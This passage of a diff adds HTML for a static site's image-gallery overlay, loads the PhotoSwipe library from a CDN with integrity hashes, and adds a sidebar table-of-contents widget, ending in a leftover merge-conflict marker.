+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">Table of contents</h2>
+                
+                <div class="widget--toc">
+>>>>>>> 0b781f88c4081f7a9d007cfd2302254a37f661ad
                     <nav id="TableOfContents">
   <ul>
     <li><a href="#web">Web</a>
